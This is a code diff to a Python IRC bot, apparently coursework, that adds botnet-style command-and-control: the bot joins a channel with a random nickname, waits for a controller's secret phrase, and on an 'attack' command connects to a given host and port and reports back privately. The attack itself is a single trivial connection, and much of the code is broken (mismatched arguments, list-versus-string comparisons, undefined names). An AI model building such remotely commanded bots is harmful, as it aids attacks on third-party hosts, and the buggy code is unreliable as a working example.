@@ -9,6 +9,8 @@ CHANNEL = None
 PHRASE = None 
 IRC = None
 CONTROLLER_FLAG = True 
+IRCSOCKET = None
+
 
 # BOT TODO
 # Listen on channel and detect secret phrase from controller
@@ -16,13 +18,46 @@ CONTROLLER_FLAG = True
 # Commands: Network attack, migration to different IRC, ShutDown
 # Report status of command execution to controller
 
+# CONTROLLER INFO
+conNick = None 
+conFlag = True #Check if controller is active
+
+# BOT INFO
+attackCounter = 0
+botNick = "IRCBOT "
+
+# BOT JOINS A CHANNEL
+# https://pythonspot.com/en/building-an-irc-bot/
+def joinIRC(IRCSOCKET, CHANNEL):
+    global botNick
+    botNick = botNick + str(random.randrange(10000))
+    sendMsg(IRCSOCKET, "USER " + botNick + " " + botNick + " " + botNick + ": Connecting to server\n")
+    sendMsg(IRCSOCKET, "NICK " + botNick + "\n")
+    sendMsg(IRCSOCKET, "JOIN " + CHANNEL + "\n")
+
+
+# THESE ARE THE FUNCTIONS FOR THE COMMANDS
 def getStatus():    
-    return
+    return 
 
-def cmdAttack():
-    pass
+# Attack a host 
+def cmdAttack(conNick, host, port):
+    global attackCounter, botNick, conNick
+    # Initialize attack
+    try:
+        target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        target.connect((host,port))
+        msg = bytes(str(attackCounter) + " " + botNick + "\n", 'utf-8')
+        target.send(msg)
+        sendPrivate(botNick + " attack successful", conNick)
+        attackCounter = attackCounter + 1
+        return True 
+    except:
+        sendPrivate(botNick + " attack unsuccessful", conNick)
+        return False 
 
-def cmdMove():
+# Move to a different IRC server/channel
+def cmdMove(conNick, host, port, channel):
     pass 
 
 def cmdQuit():
@@ -32,9 +67,9 @@ def cmdShutdown():
     pass
 
 # SEND PRIVATE MESSAGE TO CONTROLLER
-def sendPrivate(conName, msg):
+def sendPrivate(conNick, msg):
     # Send private message to Controller
-    sock.send(ircSocket, "PRIVMSG " + conName + " :" + msg + "\n")
+    sock.send(IRCSOCKET, "PRIVMSG " + conNick + " :" + msg + "\n")
     return
 
 # SEND MESSAGE TO IRC
@@ -42,57 +77,66 @@ def sendMsg(sock, msg):
     msg = msg.encode('utf-8', 'ignore')
     sock.send(msg)
 
-# GET MESSAGE FROM IRC
-def getMsg():
-    pass
 
 
-# GET COMMANDS FROM CONTROLLER
-# This might be the same as ircSocket since it's still reading the stuff from the IRC server
-def getCommand(conSocket):
-    msg = conSocket.recv(1024).decode('utf-8', 'ignore').strip()
-    return 
+
+# GET COMMANDS FROM CONTROLLER AKA READ IRC MESSAGES
+def getCommand(IRCSOCKET):
+    msg = IRCSOCKET.recv(1024).decode('utf-8', 'ignore').strip()
+    if msg == "":
+        return False
+    else:
+        return msg
 
 # DO COMMANDS
 def commandHandler():
 
     # Get Commands
     # status, attack <host><port>, move<host><port><channel>, quit, shutdown
-    command = getCommand(conSocket)
+    command = getCommand(IRCSOCKET)
     command = command.split()
 
-    if command == "status":
-        print("Command: status")
-        cmdStatus = getStatus()
-        print(str(status))
-    elif command == "attack":
-        try:
-            host = command[1]
-            port = command[2]
-            print("Command: attack " + str(host) + " " + str(port))
-            cmdAttack(host, port)
-        except:
-            pass
-    elif command == "move":
-        try:
-            host = command[1]
-            port = command[2]
-            channel = command[3]
-            cmdMove(host, port, channel)
-            print("Command: move " + str(host) + " " + str(port) + " " + str(channel))
-    elif command == "quit":
-        cmdQuit()
-    elif command == "shutdown":
-        cmdShutdown()
+    # Check if secretPhrase has been said at the end
+    if command(len(command) - 1) == PHRASE:
+        # Check for commands if secretPhrase has been said 
 
+        # Get status of bot
+        if command == "status":
+            print("Command: status")
+            cmdStatus = getStatus()
+            print(str(status))
 
+        # Start attack
+        elif command == "attack":
+            try:
+                host = command[1]
+                port = command[2]
+                print("Command: attack " + str(host) + " " + str(port))
+                cmdAttack(host, port)
+            except:
+                pass
+
+        # Move to another IRC channel
+        elif command == "move":
+            try:
+                host = command[1]
+                port = command[2]
+                channel = command[3]
+                cmdMove(host, port, channel)
+                print("Command: move " + str(host) + " " + str(port) + " " + str(channel))
+        elif command == "quit":
+            cmdQuit()
+        elif command == "shutdown":
+            cmdShutdown()
+
+# THIS IS WHERE ALL THE COMMUNICATION STUFF HAPPENS
 
 # CONNECT TO IRC SERVER CHANNEL
 # This next line goes to a function
 # ircSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-def serverConnect(ircSocket, host, port):
+def serverConnect(IRCSOCKET, host, port):
     try:
-        ircSocket.connect((host,port))
+        IRCSOCKET.connect((host,port))
         print("Connection successful")
         return True
     except:
@@ -104,6 +148,7 @@ def serverConnect(ircSocket, host, port):
 
 if __name == "__main__":
 
+    global HOST, PORT, CHANNEL, PHRASE, IRCSOCKET 
     # Get sys.args
     if len(sys.argv) != 4:
         print("Wrong number of inputs")
@@ -120,10 +165,13 @@ if __name == "__main__":
 
     # Keep Connection to IRC Server
     while True:
-        ircSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        IRCSOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         # Do connection stuff
         connectionFlag = serverConnect(ircSocket, HOST, PORT)
         while connectionFlag:
+            # This is the main part of the code
+            # Keep looking if it's connected and if it is, 
+            # keep reading messages from IRC server
             commandHandler()
             
         
